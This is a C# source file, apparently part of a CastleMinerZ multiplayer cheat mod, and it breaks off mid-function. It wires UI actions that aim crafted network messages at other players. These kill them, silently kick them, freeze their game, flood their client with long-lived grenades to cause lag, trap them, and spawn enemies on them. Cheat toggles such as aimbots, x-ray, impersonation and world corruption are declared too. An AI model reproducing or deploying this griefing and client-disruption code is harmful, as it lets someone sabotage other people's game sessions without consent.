/*
SPDX-License-Identifier: GPL-3.0-or-later
Copyright (c) 2025 RussDev7
This file is part of https://github.com/RussDev7/CastleForge - see LICENSE for details.
*/

using Microsoft.Xna.Framework.Graphics;
using Microsoft.Xna.Framework.Input;
using System.Security.Cryptography;
using DNA.CastleMinerZ.Inventory;
using System.Collections.Generic;
using DNA.CastleMinerZ.Terrain;
using Microsoft.Xna.Framework;
using System.Threading.Tasks;
using DNA.Net.GamerServices;
using DNA.CastleMinerZ.Net;
using DNA.CastleMinerZ.AI;
using DNA.CastleMinerZ.UI;
using System.Diagnostics;
using System.Reflection;
using DNA.CastleMinerZ;
using DNA.Drawing.UI;
using ModLoaderExt;
using DNA.Drawing;
using System.Text;
using DNA.Timers;
using HarmonyLib;
using System.Net;
using DNA.Input;
using ModLoader;
using System.IO;
using System;
using DNA;

using static CastleWallsMk2.FeedbackRouter;
using static CastleWallsMk2.ServerCommands;
using static CastleWallsMk2.GamePatches;
using static CastleWallsMk2.CryptoRng;
using static CastleWallsMk2.IGMainUI;
using static ModLoader.LogSystem;

namespace CastleWallsMk2
{
    [Priority(ModLoader.Priority.Normal)]
    [RequiredDependencies("ModLoaderExtensions")]
    public class CastleWallsMk2 : ModBase
    {
        /// <summary>
        /// Entrypoint for the Example mod: Sets up command dispatching, patches, and world lookup.
        /// </summary>
        #region Mod Initiation

        private readonly CommandDispatcher _dispatcher; // Dispatcher that routes incoming "/commands" to attributed methods.
        // private object                  _world;      // Holds the reference to the game's world object once it becomes available.

        // Mod constructor: Invoked by the ModLoader when instantiating your mod.
        public CastleWallsMk2() : base("CastleWallsMk2", new Version("0.1.0"))
        {
            EmbeddedResolver.Init();                    // Load any native & managed DLLs embedded as resources (e.g., Harmony, cimgui, other libs).
            _dispatcher = new CommandDispatcher(this);  // Create the command dispatcher, pointing it at this instance so it can find [Command]-annotated methods.

            var game = CastleMinerZGame.Instance;       // Hook into the game's shutdown event to clean up patches and resources on exit.
            if (game != null)
                game.Exiting += (s, e) => Shutdown();
        }

        /// <summary>
        /// Called once when the mod is first loaded by the ModLoader.
        /// Good place to:
        /// 1) Verify the game is running.
        /// 2) Install any Harmony patches or interceptors.
        /// 3) Register your command handlers.
        /// </summary>
        public override void Start()
        {
            // Acquire game and world references.
            var game = CastleMinerZGame.Instance;
            if (game == null)
            {
                Log("Game instance is null.");
                return;
            }

            // Extract embedded resources for this mod into the
            // !Mods/<Namespace> folder; skipped if nothing embedded.
            var ns    = typeof(CastleWallsMk2).Namespace;
            var dest  = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "!Mods", ns);
            var wrote = EmbeddedExporter.ExtractFolder(ns, dest);
            if (wrote > 0) Log($"Extracted {wrote} file(s) to {dest}.");

            // Load or create config.
            var cfg = ModConfig.LoadOrCreateDefaults();

            // Immediately attempt to pick & apply a random username from
            // <Namespace>/UsernameList.txt (if present and non-empty)
            // at game initiation.
            if (cfg.RandomizeUsernameOnLaunch)
            {
                try { UsernameRandomizer.TryApplyAtStartup(); } catch { /* Never crash on optional features. */ }
            }

            // Apply game patches.
            GamePatches.ApplyAllPatches();

            // Load server host history (Server tab).
            try { ServerHistory.Load(); } catch { }

            // Wire the UI controls.
            WireUi();

            // Initialize host-side chat command registry defaults.
            ServerCommandRegistry.EnsureInitialized();

            // Initialize the console element logger.
            ConsoleCapture.Init();

            // If enabled, start streaming all ChatLog entries (console + chat)
            // to a timestamped file under !Mods\<Namespace>\!Logs.
            if (cfg.StreamLogToFile)
                ConsoleLogStreamer.Enable();

            // Register this mod's command dispatcher with the interceptor.
            // Each time a player types "/command", our dispatcher will be invoked.
            // Also register this plugin's command list to the global help registry.
            ChatInterceptor.RegisterHandler(raw => _dispatcher.TryInvoke(raw));
            HelpRegistry.Register(this.Name, commands);

            // Notify in log that the mod is ready.
            // Lazy: Use this namespace as the 'mods' name.
            Log($"{MethodBase.GetCurrentMethod().DeclaringType.Namespace} loaded.");
        }

        /// <summary>
        /// Called when the game exits or mod is unloaded.
        /// Used to safely dispose patches and resources.
        /// </summary>
        public static void Shutdown()
        {
            try
            {
                try { IGMainUI.CaptureRememberedToggleSnapshot();                   } catch (Exception ex) { Log($"Save remembered toggles failed: {ex.Message}."); } // Flush remembered gameplay toggles.
                try { IGMainUI.CaptureRememberedSliderSnapshot();                   } catch (Exception ex) { Log($"Save remembered sliders failed: {ex.Message}."); } // Flush remembered gameplay toggles.
                try { ServerHistory.SaveIfDirty();                                  } catch (Exception ex) { Log($"Flush server history failed: {ex.Message}.");    } // Flush server host history to disk.
                try { GamePatches.DisableAll();                                     } catch (Exception ex) { Log($"Disable hooks failed: {ex.Message}.");           } // Unpatch Harmony.
                try { IGMainUI.DisposeLogFilter();                                  } catch (Exception ex) { Log($"Log-filter dispose failed: {ex.Message}.");      } // Dispose log filter.
                try { IGMainUI.DisposeNetLogFilter();                               } catch (Exception ex) { Log($"NetLog-filter dispose failed: {ex.Message}.");   } // Dispose log filter.
                try { ConsoleLogStreamer.Disable();                                 } catch (Exception ex) { Log($"Log-streamer dispose failed: {ex.Message}.");    } // Dispose log streamer.
                try { IGMainUI.ImGuiSettings_Save();                                } catch (Exception ex) { Log($"Save imgui settings failed: {ex.Message}.");     } // Save the imgui settings to file.
                try { ImGuiXnaRenderer.Shutdown(); Log("ImGui Renderer disposed."); } catch (Exception ex) { Log($"Renderer shutdown failed: {ex.Message}.");       } // Let the renderer clean up everything.

                // Notify in log that the mod teardown was complete.
                // Lazy: Use this namespace as the 'mods' name.
                Log($"{MethodBase.GetCurrentMethod().DeclaringType.Namespace} shutdown complete.");
            }
            catch (Exception ex)
            { Log($"Error shutting down mod: {ex}."); }
        }
        #endregion

        /// <summary>
        /// This is the main function logic for the mod.
        /// </summary>
        #region CastleWallsMk2 Mod

        // Local enabled state (we use these inside OnTick to keep effects alive).
        internal static LocalPlayer MsgHandler;
        private bool                _wasInGame;
        public static bool          _corruptWorldActive;
        public static bool          _itemVortexTargetsUs;
        public static string        _ghostModeNameBackup;
        private static bool         _showStatsWindow;
        public static bool          _rapidFireEnabled, _superGunStatsEnabled, _fullBrightEnabled; // Runtime-enabled states used for session teardown/reapply.

        public static bool      _godEnabled, _infiniteItemsEnabled, _infiniteDurabilityEnabled, _noKickEnabled, _noEnemiesEnabled, _noConsumeAmmo, _infiClipsEnabled, _flyEnabled,
                                _noTargetEnabled, _tracersEnabled, _hitboxesEnabled, _playerAimbotEnabled, _dragonAimbotEnabled, _mobAimbotEnabled, _aimbotBulletDropEnabled,
                                _aimbotFaceEnemyEnabled, _aimbotRequireLosEnabled, _noGunCooldownEnabled, _noGunRecoilEnabled, _vanishEnabled, _vanishIsDeadEnabled,
                                _playerPositionEnabled, _movementSpeedEnabled, _pickupRangeEnabled, _xrayEnabled, _instantMineEnabled, _rapidToolsEnabled, _noMobBlockingEnabled,
                                _multiColorAmmoEnabled, _multiColorRNGEnabled, _shootBlocksEnabled, _shootHostAmmoEnabled, _shootGrenadeAmmoEnabled, _shootRocketAmmoEnabled,
                                _freezeLasersEnabled, _extendLaserTimeEnabled, _infiLaserPathEnabled, _infiLaserBounceEnabled, _explosiveLasersEnabled, _noTPOnServerRestartEnabled,
                                _corruptOnKickEnabled, _projectileTuningEnabled, _freeFlyCameraEnabled, _noClipEnabled, _rideDragonEnabled, _shootBowAmmoEnabled, _explodingOresEnabled,
                                _shootFireballAmmoEnabled, _rocketSpeedEnabled, _forceRespawnEnabled, _gravityEnabled, _disableInvRetrievalEnabled, _cameraXyzEnabled, _muteEnabled,
                                _muteWarnOffenderEnabled, _muteShowMessageEnabled, _trailEnabled, _trailPrivateEnabled, _showerEnabled, _dragonCounterEnabled, _hatEnabled, _bootsEnabled,
                                _rapidItemsEnabled, _disableControlsEnabled, _itemVortexEnabled, _beaconModeEnabled, _chaosModeEnabled, _clockDiscordEnabled, _dragonDiscordEnabled,
                                _hugEnabled, _noLavaVisualsEnabled, _reliableFloodEnabled, _blockEspEnabled, _blockEspNoTraceEnabled, _nametagsEnabled, _spamTextEnabled, _spamTextSudoEnabled,
                                _chaoticAimEnabled, _disableItemPickupEnabled, _ghostModeEnabled, _ghostModeHideNameEnabled, _rapidPlaceEnabled, _sudoPlayerEnabled, _doorSpamEnabled,
                                _allGunsHarvestEnabled, _pvpThornsEnabled, _trialModeEnabled, _deathAuraEnabled, _begoneAuraEnabled, _blockNukerEnabled;

        // Sliders:
        private static TriState _worldTimeState;
        public static int       _worldTimeDay;
        public static float     _extendedPickupRange;
        public static float     _aimbotRandomDelay;
        public static int       _projectileTuningValue;
        public static float     _deathAuraRange, _begoneAuraRange;
        public static float     _rocketSpeedValue            = 25.00f, _rocketSpeedGuidedValue = 50.00f;
        public static float     _gravityValue                = -20f;
        public static float     _cameraXValue, _cameraYValue, _cameraZValue;
        public static int       _chaosTimerValue, _showerTimerValue, _rapidItemsTimerValue, _itemVortexTimerValue;
        public static int       _beaconHeightValue           = 48;
        public static int       _floodValue                  = 1000;
        public static int       _blockEspChunkRadValue       = 2;
        public static int       _blockEspMaxBoxesValue       = 256;
        public static Color     _espColor                    = Color.Cyan;
        public static int       _spamTextValue               = 100;
        public static int       _caveLighterMaxDistanceValue = 16;
        public static int       _blockNukerRangeValue        = 0;

        // RadioButtons:
        public enum   PlayerSelectScope { Personal, Everyone            }
        public enum   VanishSelectScope { InPlace, Spawn, Distant, Zero }
        public static PlayerSelectScope _shootBlockScope      = PlayerSelectScope.Personal;
        public static PlayerSelectScope _shootAmmoScope       = PlayerSelectScope.Personal;
        public static PlayerSelectScope _explosiveLasersScope = PlayerSelectScope.Personal;
        public static VanishSelectScope _vanishScope          = VanishSelectScope.InPlace;

        // Textboxes:
        public static string _spamTextMessage = string.Empty;
        public static string _sudoNameMessage = string.Empty;

        // Dropdowns:

        // Define enums.
        public static DragonTypeEnum   _shootFireballType = DragonTypeEnum.FIRE;
        public static InventoryItemIDs _rapidItemsType    = InventoryItemIDs.AssultRifle;
        public static InventoryItemIDs _showerType        = InventoryItemIDs.AssultRifle;
        public static InventoryItemIDs _itemVortexType    = InventoryItemIDs.Diamond;
        public static BlockTypeEnum    _wearType          = BlockTypeEnum.SpawnPointBasic;
        public static BlockTypeEnum    _trailType         = BlockTypeEnum.Torch;

        // Block-based multi target.
        public static readonly HashSet<BlockTypeEnum>           _blockEspTypes        = new HashSet<BlockTypeEnum> { };
        public static readonly Dictionary<BlockTypeEnum, Color> _blockEspTracerColors = new Dictionary<BlockTypeEnum, Color>(); // Runtime-only per-block tracer colors (not saved to config).

        // Player-based multi target.
        public static PlayerTargetMode _forceRespawnTargetMode      = PlayerTargetMode.None;
        public static byte[]           _forceRespawnTargetNetids    = new byte[] { 0 };
        public static PlayerTargetMode _muteTargetMode              = PlayerTargetMode.None;
        public static byte[]           _muteTargetNetids            = new byte[] { 0 };
        public static PlayerTargetMode _disableControlsTargetMode   = PlayerTargetMode.None;
        public static byte[]           _disableControlsTargetNetids = new byte[] { 0 };
        public static PlayerTargetMode _trailTargetMode             = PlayerTargetMode.None;
        public static byte[]           _trailTargetNetids           = new byte[] { 0 };
        public static PlayerTargetMode _rapidItemsTargetMode        = PlayerTargetMode.None;
        public static byte[]           _rapidItemsTargetNetids      = new byte[] { 0 };
        public static PlayerTargetMode _showerTargetMode            = PlayerTargetMode.None;
        public static byte[]           _showerTargetNetids          = new byte[] { 0 };
        public static PlayerTargetMode _reliableFloodTargetMode     = PlayerTargetMode.None;
        public static byte[]           _reliableFloodTargetNetids   = new byte[] { 0 };
        public static PlayerTargetMode _itemVortexTargetMode        = PlayerTargetMode.None;
        public static byte[]           _itemVortexTargetNetids      = new byte[] { 0 };
        public static PlayerTargetMode _doorSpamTargetMode          = PlayerTargetMode.None;
        public static byte[]           _doorSpamTargetNetids        = new byte[] { 0 };

        // Single target.
        public static PlayerTargetMode _hugTargetMode               = PlayerTargetMode.None;
        public static byte             _hugTargetNetid              = (byte)0;
        public static PlayerTargetMode _spamTextTargetMode          = PlayerTargetMode.None;
        public static byte             _spamTextTargetNetid         = (byte)0;
        public static PlayerTargetMode _sudoPlayerTargetMode        = PlayerTargetMode.None;
        public static byte             _sudoPlayerTargetNetid       = (byte)0;

        // Live vectors.
        public static Vector3          _hugLocation                 = Vector3.Zero;
        public static Vector3          _vanishLocation              = Vector3.Zero;
        public static Vector3          _itemVortexLocation          = Vector3.Zero;

        // Simple and cheap guard for checking if any aimbots enabled state is true.
        public static bool AnyAimbotEnabled() => _playerAimbotEnabled || _mobAimbotEnabled || _dragonAimbotEnabled;

        // Int-based pickup entity & spawer id counting states.
        public static int _globalPickupIdCounter = 0, _globalSpawnerIdCounter = 0;

        // Simple helpers for converting to types.
        #region Fireball Type Conversions

        public enum FireballTypes
        {
            Fireball,
            Iceball
        }
        public static DragonTypeEnum FireballToDragon(FireballTypes fireballType)
        {
            if (fireballType == FireballTypes.Iceball)
                return DragonTypeEnum.ICE;
            else
                return DragonTypeEnum.FIRE;
        }
        #endregion

        #region PlayerTarget Type Conversions

        /// <summary>
        /// Player Target Selection
        /// -----------------------
        /// Shared selection state used by UI + features.
        /// - None: no target selected.
        /// - Player: a specific NetworkGamer by NetworkId.
        /// - AllPlayers: target everyone.
        /// </summary>
        public enum PlayerTargetMode : byte
        {
            None       = 0,
            Player     = 1,
            AllPlayers = 2
        }
        #endregion

        // Helpers for runtime colors.
        #region Block ESP Runtime Colors

        /// <summary>
        /// Gets the tracer color for the given block type, lazily creating a default
        /// rainbow color if one has not been assigned yet.
        /// </summary>
        public static Color GetBlockEspTracerColor(BlockTypeEnum type, int ordinalHint = -1, int countHint = -1)
        {
            if (_blockEspTracerColors.TryGetValue(type, out Color color))
                return color;

            // If we do not have stable list-position info yet, return a temporary fallback
            // but DO NOT cache it, otherwise we lock this block to red forever.
            if (ordinalHint < 0 || countHint <= 1)
                return Color.Red;

            color = BuildDefaultBlockEspTracerColor(ordinalHint, countHint);
            _blockEspTracerColors[type] = color;
            return color;
        }

        /// <summary>Sets a runtime-only tracer color for the given block type.</summary>
        public static void SetBlockEspTracerColor(BlockTypeEnum type, Color color)
        {
            _blockEspTracerColors[type] = color;
        }

        /// <summary>
        /// Builds a default ROYGBVP-style color spread.
        /// The hue is spaced across the visible block list so later entries continue through the rainbow.
        /// </summary>
        private static Color BuildDefaultBlockEspTracerColor(int ordinal, int count)
        {
            if (ordinal < 0 || count <= 1)
                return Color.Red;

            // Red -> orange -> yellow -> green -> blue -> violet/purple.
            // 0.00 ~= red, 0.83 ~= purple.
            float hue = (ordinal / (float)Math.Max(1, count - 1)) * 0.83f;

            return ColorFromHSV(hue, 0.90f, 1.00f);
        }

        /// <summary>Simple HSV -> XNA Color helper.</summary>
        private static Color ColorFromHSV(float h, float s, float v)
        {
            h = MathHelper.Clamp(h, 0f, 1f);
            s = MathHelper.Clamp(s, 0f, 1f);
            v = MathHelper.Clamp(v, 0f, 1f);

            float hh = h * 6f;
            int i = (int)Math.Floor(hh);
            float f = hh - i;

            float p = v * (1f - s);
            float q = v * (1f - s * f);
            float t = v * (1f - s * (1f - f));

            float r, g, b;
            switch (i % 6)
            {
                default:
                case 0: r = v; g = t; b = p; break;
                case 1: r = q; g = v; b = p; break;
                case 2: r = p; g = v; b = t; break;
                case 3: r = p; g = q; b = v; break;
                case 4: r = t; g = p; b = v; break;
                case 5: r = v; g = p; b = q; break;
            }

            return new Color(r, g, b, 1f);
        }
        #endregion

        // Wires the ImGui UI callbacks to simple log actions.
        public static void WireUi()
        {
            // ======= //
            // Buttons //
            // ======= //

            #region Set Name

            Callbacks.OnSetName = name =>
            {
                try
                {
                    var raw = name ?? string.Empty;

                    // Decode HTML entities -> Unicode.
                    // "<test>"           => "<test>".
                    // "&#33;hello&Delta;&#33;" => "!helloΔ!".
                    name = WebUtility.HtmlDecode(raw);

                    // Optional: Decode twice to handle "&amp;lt;" => "<" => "<".
                    name = WebUtility.HtmlDecode(name);

                    try { CastleMinerZGame.Instance.MyNetworkGamer.Gamertag = name; } catch (Exception) { }
                    try { Gamer.SignedInGamers[PlayerIndex.One].Gamertag    = name; } catch (Exception) { }
                 // try { UsernameRandomizer.RandomizeID();                         } catch (Exception) { }
                } catch { }
                SendLog($"Set Name: '{name}'");
            };
            #endregion

            /// === [Target] ===

            #region Spawn Mobs

            Callbacks.OnSpawnMobs = (target, type, amount, offset, samePos) =>
            {
                try { SpawnMob(target, type, amount, offset, samePos); } catch { }
                SendLog($"Spawned {amount} {type}{(amount > 1 ? "'s" : string.Empty)} on '{target?.Gamertag ?? "(none)"}'");
            };
            #endregion

            #region Spawn Mobs At Cursor

            Callbacks.OnSpawnMobsAtCrosshair = (target, type, amount) =>
            {
                Vector3 cursorPos   = InGameHUD.Instance.ConstructionProbe._worldIndex;
                        cursorPos.Y += 1;
                try { SpawnMobAtPos(target, type, cursorPos, amount); } catch { }
                SendLog($"Spawned {amount} {type}{(amount > 1 ? "'s" : string.Empty)} at the cursor location (target='{target?.Gamertag ?? "(none)"}')");
            };
            #endregion

            #region TP Mobs To Cursor

            Callbacks.OnTpAllMobsToCrosshair = (target) =>
            {
                int enemyAmount = 0;
                try { enemyAmount = TpAllMobsToCursor(target); } catch { }
                SendLog($"Moved {enemyAmount} mob{(enemyAmount > 1 ? "'s" : string.Empty)} to the cursor location (target='{target?.Gamertag ?? "(none)"}')");
            };
            #endregion

            #region Spawn Dragons

            Callbacks.OnSpawnDragons = (target, type, amount, healthMultiplier) =>
            {
                try { SpawnDragon(target, type, amount, healthMultiplier); } catch { }
                SendLog($"Spawned {amount} {type} Dragon{(amount > 1 ? "'s" : string.Empty)} (hp:{GetDragonsHP(type) * healthMultiplier}) on '{target?.Gamertag ?? "(none)"}'");
            };

            async void SpawnDragon(NetworkGamer gamer, DragonTypeEnum dragonTypeEnum, int amount = 1, int healthMultiplier = 1)
            {
                Player p = null;
                foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                    if (((Player)networkGamer.Tag).Gamer == gamer)                                               // Match the selected gamer.
                    {
                        p = (Player)networkGamer.Tag;
                        for (int i = 0; i < amount; i++)
                            SpawnDragonMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, p.Gamer?.Id ?? 0, dragonTypeEnum, false, GetDragonsHP(dragonTypeEnum) * healthMultiplier);
                        break;
                    }

                /*
                // Send a short wait.
                await Task.Delay(100);

                // Check if we migrated.
                var Migration = GetExistingDragonInfo();
                if (Migration == null)
                {
                    SendLog("Migration skipped: No host dragon to snapshot yet.");
                    return;
                }

                // Migrate the dragon to a targeted player.
                MigrateDragonMessage.Send((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer, p.Gamer?.Id ?? 0, Migration);
                */
            }

            #region Helpers

            /// <summary>
            /// Snapshot the current server-authoritative dragon state into a
            /// DragonHostMigrationInfo payload (used when migrating dragon ownership).
            /// </summary>
            /*
            DragonHostMigrationInfo GetExistingDragonInfo()
            {
                var mgr          = EnemyManager.Instance;
                var latestDragon = DragonEntityRef(mgr);
                if (latestDragon == null) return null;

                return new DragonHostMigrationInfo
                {
                    Yaw               = latestDragon.Yaw,
                    TargetYaw         = latestDragon.TargetYaw,
                    Roll              = latestDragon.Roll,
                    TargetRoll        = latestDragon.TargetRoll,
                    Pitch             = latestDragon.Pitch,
                    TargetPitch       = latestDragon.TargetPitch,
                    NextDragonTime    = latestDragon.DragonTime     + 0.4f,
                    NextUpdateTime    = latestDragon.NextUpdateTime + 0.4f,
                    Position          = latestDragon.LocalPosition,
                    Velocity          = latestDragon.Velocity,
                    TargetVelocity    = latestDragon.TargetVelocity,
                    DefaultHeading    = latestDragon.DefaultHeading,
                    NextFireballIndex = latestDragon.GetNextFireballIndex(),
                    ForBiome          = latestDragon.ForBiome,
                    Target            = latestDragon.TravelTarget,
                    EType             = latestDragon.EType.EType,
                 // FlapDebt          = latestDragon.FlapDebt,
                 // Animation         = latestDragon.CurrentAnimation,
                };
            }
            */

            /// <summary>
            /// Return a dragons default HP based on its biome type.
            /// </summary>
            float GetDragonsHP(DragonTypeEnum dragonType)
            {
                switch (dragonType)
                {
                    case DragonTypeEnum.FIRE:
                        return 20f;
                    case DragonTypeEnum.FOREST:
                        return 100f;
                    case DragonTypeEnum.LIZARD:
                        return 300f;
                    case DragonTypeEnum.ICE:
                        return 600f;
                    case DragonTypeEnum.SKELETON:
                        return 1000f;
                    default:
                        return 20f;
                }
            }
            #endregion

            #endregion

            #region Give Items

            Callbacks.OnGiveItems = (target, type, amount) =>
            {
                int remainingAmount = amount;
                try
                {
                    while (remainingAmount > 999)
                    {
                        GivePlayerItems((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer, target, type, 999);
                        remainingAmount -= 999;
                    }
                    GivePlayerItems((LocalNetworkGamer)CastleMinerZGame.Instance.LocalPlayer.Gamer, target, type, remainingAmount);
                } catch { }
                SendLog($"Gave {amount} {type}{(amount > 1 ? "'s" : string.Empty)} to '{target?.Gamertag ?? "(none)"}'");
            };
            #endregion

            #region Teleport To Location

            Callbacks.OnTeleportToLocation = (pos, onTop) =>
            {
                try
                {
                    TeleportUser(pos, onTop);
                }
                catch { }

                SendLog($"Teleported local player to X:{pos.X:0.##} Y:{pos.Y:0.##} Z:{pos.Z:0.##}");
            };

            void TeleportUser(Vector3 location, bool spawnOnTop)
            {
                if (spawnOnTop)
                    CastleMinerZGame.Instance.GameScreen.TeleportToLocation(
                        new DNA.IntVector3((int)location.X, (int)location.Y, (int)location.Z),
                        spawnOnTop
                    );
                else
                    CastleMinerZGame.Instance.LocalPlayer.LocalPosition = location;
            }
            #endregion

            /// === [Selected Player] ===

            #region Kill Selected Player

            Callbacks.OnKillSelectedPlayer = gamer =>
            {
                try { KillSelectedPlayer(gamer); } catch { }
                SendLog($"Killed Selected Player: '{gamer.Gamertag}'");
            };
            #endregion

            #region TP To Player

            Callbacks.OnTpToPlayer = gamer =>
            {
                try { TpToSelectedPlayer(gamer); } catch { }
                SendLog($"Teleported To Player: '{gamer.Gamertag}'");
            };
            #endregion

            #region View Players Steam

            Callbacks.OnViewSteamAccount = gamer =>
            {
                try
                {
                    var steamId = gamer.AlternateAddress;
                    if (steamId != 0)
                    {
                        OpenUsersSteamProfile(gamer.AlternateAddress);
                        SendLog($"Opened Steam Profile Of: '{gamer.Gamertag}'");
                    }
                    else
                        SendLog($"Error: Cannot open the profile for '{gamer.Gamertag}'. As non-host, you can only grab the host's ID.");
                } catch { }
            };

            void OpenUsersSteamProfile(ulong steamId)
            {
                // Build the Steam URL. This uses Steam's URI scheme which the Steam client handles.
                var uri = "steam://url/SteamIDPage/" + steamId.ToString();
                try
                {
                    // Preferred: Launch via the OS shell so the steam:// protocol handler is used.
                    Process.Start(new ProcessStartInfo(uri) { UseShellExecute = true });
                }
                catch
                {
                    // Fallback for older frameworks/runtimes that may not like ProcessStartInfo.
                    Process.Start(uri);
                }
            }
            #endregion

            #region Lootbox Selected Player

            Callbacks.OnLootboxSelectedPlayer = gamer =>
            {
                try { GiveLootboxes(gamer); } catch { }
                SendLog($"Spawned Lootboxes On: '{gamer.Gamertag}'");
            };

            void GiveLootboxes(NetworkGamer player)
            {
                // Give 3 * 3 lootboxes.
                for (int i = 0; i < (3 * 3); i++)
                {
                    // Get lootbox type.
                    BlockTypeEnum lootboxType = (BlockTypeEnum)GenerateRandomNumberInclusive(69, 70); // ID 69: Lootbox, ID 70: LuckyLootbox.

                    // Spawn loot in via vanilla processing.
                    PossibleLootType.ProcessLootBlockOutput(lootboxType, (IntVector3)(((Player)player?.Tag)?.LocalPosition ?? IntVector3.Zero));
                }
            }
            #endregion

            #region Restart Selected Player

            Callbacks.OnRestartSelectedPlayer = gamer =>
            {
                try { RestartLevelPrivate(CastleMinerZGame.Instance.MyNetworkGamer, gamer); } catch { }
                SendLog($"Restarted Selected Player: '{gamer.Gamertag}'");
            };
            #endregion

            #region Kick Selected Player

            Callbacks.OnKickSelectedPlayer = gamer =>
            {
                try { KickSelectedPlayer(gamer); } catch { }
                SendLog($"Silently Kicked Selected Player: '{gamer.Gamertag}'");
            };
            #endregion

            #region Freeze Selected Player

            Callbacks.OnFreezeSelectedPlayer = gamer =>
            {
                try { FreezeSelectedPlayer(gamer); } catch { }
                SendLog($"Froze Selected Players Game: '{gamer.Gamertag}'");
            };
            #endregion

            #region Genade Collision Lag

            Callbacks.OnGrenadeCollisionLagSelectedPlayer = gamer =>
            {
                try
                {
                    // Safe spawn location.
                    var playerPos = ((Player)gamer.Tag)?.LocalPosition ?? WorldInfo.DefaultStartLocation;
                    var loc       = new Vector3((float)Math.Floor(playerPos.X), -63, (float)Math.Floor(playerPos.Z));
                    var airLoc    = new Vector3(loc.X - 1, -63, loc.Z - 1);

                    // Place spawn pad.
                    PlaceBlocksPrivate(CastleMinerZGame.Instance.MyNetworkGamer, (IntVector3)loc,    BlockTypeEnum.Bedrock, gamer);
                    PlaceBlocksPrivate(CastleMinerZGame.Instance.MyNetworkGamer, (IntVector3)airLoc, BlockTypeEnum.Empty,   gamer);

                    // Corner placement math.
                    const float eps = 0.03f;

                    Vector3 desiredPos = new Vector3(
                        loc.X     - eps,
                        loc.Y + 1 - eps,
                        loc.Z     - eps);

                    // Send 1000x private grenades.
                    for (int i = 0; i < 10; i++)
                        SpawnPrivateGrenade(CastleMinerZGame.Instance.MyNetworkGamer, gamer, desiredPos, Vector3.Down, GrenadeTypeEnum.HE, float.MaxValue);
                }
                catch { }
                SendLog($"Spawned Genade Collision Lag On Player: '{gamer.Gamertag}'");
            };

            void SpawnPrivateGrenade(LocalNetworkGamer from, NetworkGamer to, Vector3 position, Vector3 direction, GrenadeTypeEnum grenadeType, float secondsLeft)
            {
                var sendInstance         = MessageBridge.Get<GrenadeMessage>();
                sendInstance.Direction   = Vector3.Normalize(direction);
                sendInstance.Position    = position;
                sendInstance.GrenadeType = grenadeType;
                sendInstance.SecondsLeft = secondsLeft;

                MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
            }
            #endregion

            #region Detonate x100 Grenades Selected Player

            Callbacks.OnDetonate100GrenadesSelectedPlayer = gamer =>
            {
                try { Detonate100GrenadesOnPlayer(gamer); } catch { }
                SendLog($"Detonated Grenades On: '{gamer.Gamertag}'");
            };

            void Detonate100GrenadesOnPlayer(NetworkGamer gamer)
            {
                foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                    //if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                              // Exclude ourselves.
                        if (((Player)networkGamer.Tag).Gamer == gamer)                                           // Match the selected gamer.
                        {
                            for (int i = 0; i < 100; i++)
                                DetonateGrenadeMessage.Send(CastleMinerZGame.Instance.MyNetworkGamer, ((Player)networkGamer?.Tag)?.LocalPosition ?? Vector3.Zero, GrenadeTypeEnum.HE, true);
                            break;
                        }
            }
            #endregion

            #region Grenade Rain (x25) Selected Player

            Callbacks.OnGrenadeRainSelectedPlayer = gamer =>
            {
                try { GrenadeRainOnPlayer(gamer); } catch { }
                SendLog($"Rained Grenades On: '{gamer.Gamertag}'");
            };

            void GrenadeRainOnPlayer(NetworkGamer gamer)
            {
                foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                    // if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                             // Exclude ourselves.
                        if (((Player)networkGamer.Tag).Gamer == gamer)                                           // Match the selected gamer.
                        {
                            var pos          = new Vector3(((Player)networkGamer?.Tag)?.LocalPosition.X ?? 0f, 64, ((Player)networkGamer?.Tag)?.LocalPosition.Z ?? 0f);
                            const int radius = 25;
                            int r2           = radius * radius;

                            for (int x = -radius; x <= radius; ++x)
                            {
                                for (int z = -radius; z <= radius; ++z)
                                {
                                    // Circle mask: Skip points outside the radius.
                                    if ((x * x) + (z * z) > r2)
                                        continue;

                                    Vector3 newPos = Vector3.Add(pos, new Vector3(x, 0, z));

                                    // var orientation = Matrix.Invert(((Player)networkGamer.Tag).FPSCamera.View).Down;
                                    var orientation = new Vector3(0, -1, 0);
                                    SpawnGrenadeAtPosition(CastleMinerZGame.Instance.MyNetworkGamer, orientation, newPos, GrenadeTypeEnum.HE, 5);
                                }
                            }
                            break;
                        }
            }

            void SpawnGrenadeAtPosition(LocalNetworkGamer from, Vector3 orientation, Vector3 toLocation, GrenadeTypeEnum grenadeType, float secondsLeft)
            {
                var sendInstance         = MessageBridge.Get<GrenadeMessage>();
                sendInstance.Direction   = orientation;
                sendInstance.Position    = toLocation + sendInstance.Direction;
                sendInstance.GrenadeType = grenadeType;
                sendInstance.SecondsLeft = secondsLeft;

                MessageBridge.DoSend.Invoke(sendInstance, new object[] { from });
            }
            #endregion

            #region Box (Air) Selected Player

            Callbacks.OnBoxInSelectedPlayer = gamer =>
            {
                try
                {
                    PlacePlayerBox(
                        CastleMinerZGame.Instance.MyNetworkGamer,
                        (Player)gamer.Tag,
                        sidePadding:    1,
                        floorPadding:   1,
                        ceilingPadding: 1,
                        to:             gamer,
                        wallBlock:      BlockTypeEnum.NumberOfBlocks
                        );
                }
                catch { }
                SendLog($"Boxed In: {gamer.Gamertag}");
            };
            #endregion

            #region Make Hole To Bedrock

            Callbacks.OnHoleSelectedPlayer = gamer =>
            {
                try
                {
                    PlaceFootprintAirHoleToBedrock(
                            CastleMinerZGame.Instance.MyNetworkGamer,
                            (Player)gamer.Tag,
                            yMinWorld: -63,
                            to:        gamer
                            );
                }
                catch { }
                SendLog($"Created Hole To Bedrock For: {gamer.Gamertag}");
            };
            #endregion

            #region Force Player Update

            Callbacks.OnForcePlayerUpdateSelectedPlayer = gamer =>
            {
                try
                {
